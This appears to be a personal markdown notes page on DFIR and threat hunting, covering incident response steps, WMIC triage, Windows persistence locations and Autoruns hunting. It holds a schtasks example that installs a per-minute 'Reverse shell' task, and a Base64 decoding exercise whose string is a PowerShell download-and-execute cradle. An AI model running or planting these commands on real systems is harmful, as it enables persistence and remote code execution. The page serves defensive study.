# Notes on DFIR, Threat Hunting, and Malware Analysis


### Table of Contents
- [Incident Response](#incident-response)
  * [Incident Response Process](#incident-response-process)
  * [Incident Response Hierarchy of Needs](#incident-response-hierarchy-of-needs)
  * [Attack Lifecycle](#attack-lifecycle)
- [Digital Forensics](#digital-forensics)
  * [SANS Windows Forensic Analysis Poster](#sans-windows-forensic-analysis-poster)
- [Threat Hunting](#threat-hunting)
  * [Common Malware Names](#common-malware-names)
  * [Common Malware Locations](#common-malware-locations)
  * [Living of the Land Binaries](#living-of-the-land-binaries)
  * [Persitence Locations](#persitence-locations)
    + [AutoStart](#autostart)
    + [Services](#services)
    + [Scheduled Tasks](#scheduled-tasks)
    + [DLL Hijacking](#dll-hijacking)
    + [Hunting DLL Hijacking](#hunting-dll-hijacking)
    + [WMI Event Consumer Backdoors](#wmi-event-consumer-backdoors)
    + [Hunting WMI Persistence](#hunting-wmi-persistence)
    + [Hunt Persistence with Autoruns](#hunt-persistence-with-autoruns)

# Incident Response

## Incident Response Process
1. Preparation
	* Creating a response capability
	* Testing response capabilites
	* Securing Systems
	* Changes to response capabilties from lessons learned
2. Identification and Scoping
	* Alert from security tools
	* Result of threat hunting
	* Notification from user
	* Hunt for additional compromise
3. Containment/Intelligence Development
	* Identify vulnerabilities or exploits
	* Persistence Techniques
	* Lateral Movement
	* Command and Control
	* IOC developement
	* Mitigative actions to slow attacker
4. Eradication/Remediation
	* Block IPs and Domains
	* Restore systems
	* Password changes
	* Vulnerability patching
	* Prevent further adversarial access
	* Remove adversarial presence
5. Recovery
	* Improve logging (SIEM)
	* Cybersecurity Awareness
	* Segmentation
	* Password policies
	* Vulnerability management
	* Network/Endpoint visibility
6. Lessons Learned/Threat Intel Consumption
	* Verify remediations
	* Penetration tests
	* Information sharing
	* Compliance verification

## Incident Response Hierarchy of Needs
<img alt="Hierarchy with explanations" src="https://raw.githubusercontent.com/swannman/ircapabilities/master/hierarchy.png" />

[Ref: Matt Swann](https://github.com/swannman/ircapabilities)

## Attack Lifecycle
<img alt="Micosoft's Attack Lifecycle" src="https://docs.microsoft.com/en-us/advanced-threat-analytics/media/attack-kill-chain-small.jpg" />

## IR Scripting

### IR Using WMIC
- [Running WMI Scripts Against Multiple Computers](https://docs.microsoft.com/en-us/previous-versions/tn-archive/ee692838(v=technet.10))
- [WMIC for incident response](https://www.sans.org/blog/wmic-for-incident-response/)
- [Like a Kid in a WMIC Candy Store](https://isc.sans.edu/diary/Tip+of+the+Day+-+Like+a+Kid+in+a+WMIC+Candy+Store/1622)
- [PoSh-R2](https://github.com/WiredPulse/PoSh-R2)

Examples
```
/node:<remote-IP> | /user:<admin acct>
```
Get Auto-Start Process
```
wmic /node:10.1.1.1 startup list full
```
Remote Process List
```
wmic /node:10.1.1.1 process get
```
Network Configuration
```
wmic /node:10.1.1.1 nicconfig get
```
# Digital Forensics

## SANS Windows Forensic Analysis Poster
* [Link](https://github.com/w00d33/w00d33.github.io/blob/main/_files/SANS_Windows_Forensics_Poster.pdf)

# Threat Hunting

## Common Malware Names
* [The typographical and homomorphic abuse of svchost.exe, and other popular file names](https://www.hexacorn.com/blog/2015/12/18/the-typographical-and-homomorphic-abuse-of-svchost-exe-and-other-popular-file-names/)

## Common Malware Locations
* [Digging for Malware: Suspicious Filesystem Geography](http://www.malicious-streams.com/resources/articles/DGMW1_Suspicious_FS_Geography.html)

## Living of the Land Binaries
* [LOLBAS Project](https://lolbas-project.github.io/)

## Persitence Locations

### Common Autostart Locations
```
NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Run
NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\RunOnce
SOFTWARE\Microsoft\Windows\CurrentVersion\Runonce
SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run
SOFTWARE\Microsoft\Windows\CurrentVersion\Run
SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
%AppData%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

Tools
* Autoruns
* Kansa

### Services
```
HKLM\SYSTEM\CurrentControlSet\Services
```
* 0x02 = Automatic
* 0x00 = Boot Start of a Device Driver
* "sc" command can create services

Tools
* Autoruns
* "sc" command
* Kansa

### Scheduled Tasks
- at.exe
	- Deprecated but present in WinXP and Win7+
	- Recorded in at.job files and schdlgu.txt (XP)
- schtasks.exe
	- Activitiy logged in Task Scheduler and Security Logs

```powershell
schtasks /create /sc minute /mo 1 /tn "Reverse shell" /tr c:\some\directory\revshell.exe
```

Tools:
- Autoruns
- Kansa

### DLL Hijacking

DLL Search Order Hijacking
- Place malicious file ahead of DLL in search order
- Windows looks at Application directory prior to Windows/System32 folder
- Look at exe's import table
- Exception: DLLs present in the KnownDLLs Registry Key

Phantom DLL Hijacking
- Find DLLs that applications attempt to load, but doesn't exist

DLL Side Loading
- WinSXS provides a new version of a legit DLL

Relative Path DLL Hijacking
- Copy target .exe and corresponding bad .dll to a different location

Common DLL Search Order
1. DLLs already in memory
2. Side-by-side components
3. KnownDLLs List
4. Directory of the application
5. C:\Windows\System32
6. C:\Windows\System
7. C:\Windows
8. Current Directory
9. System %PATH%

### Hunting DLL Hijacking
- Machines rarely get new dlls (Application Install/Patching)

File system analysis
- Look for new or unsigned .exe/.dll files in unusual places

Memory Analysis
- Find system process or DLLs loaded from the wrong location

This technique is often followed up C2 network beaconing

### WMI Event Consumer Backdoors
- Allows triggers to be set that will run scripts and executables
- Event Filter: Trigger Condition
- Event Consumer: Script or executable to run
- Binding: Combine Filter and Consumer

Tools
- Kansa
- Autoruns

Discover Suspicious WMI Events
```powershell
Get-WMIObject -Namespace root\Subscription -Class __EventFilter
Get-WMIObject -Namespace root\Subscription -Class __Event Consumer
Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding
```

### Hunting WMI Persistence
- Look at consumers (CommandLine and Active Script)
	- Correlate to Event Filter (trigger)
- Search
	- .exe
	- .vbs
	- .ps1
	- .dll
	- .eval
	- ActiveXObject
	- powershell
	- CommandLineTemplate
	- ScriptText
- Common WMI Occurences
	- SCM Event Log Consumer
	- BVTFilter
	- TSlogonEvents.vbs
	- TSLogonFilter
	- RAevent.vbs
	- RmAssistEventFilter
	- KernCap.vbs
	- NETEventLogConsumer
	- WSCEAA.exe (Dell)

### Hunt and Analyze Persistence with Autoruns
- Live System Only
- Works for Autostart locations, Services, Scheduled Tasks, WMI Events
- Hashes files and can search VirusTotal for hits

1. Run autorunsc
 ```
 C:\>autorunsc -accepteula -a * -s -h -c -vr > \\server\share\autoruns.csv
 ```
2. Open .csv with tool of choice (e.g. Excel or TimelineExplorer)
3. Filter out trusted startup locations
	- Use signers to filter trusted code signers (can lead to false negative but is still a good place to start)
	- Look for:
		- (Not Verified)
		- Unfamiliar Signers
		- Blank (No Signer)
4. Filter by Enabled (Active)
5. Compare hashes to VirusTotal
6. Research vendor and product listed in "Publisher" and "Description" fields
7. Compare output to a the output of a known good machine

# Misc

## Decode Base64

```bash
echo  "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBzAHEAdQBpAHIAcgBlAGwAZABpAHIAZQBjAHQAbwByAHkALgBjAG8AbQAvAGEAJwApAAoA" | base64 -d | iconv -f UTF-16LE -t UTF-8
```

## Powershell CommandLine Switches
- -W: WindowStyle
- -nop: NoProfile
- -noni: NonInteractive
- -ec: EncodedCommand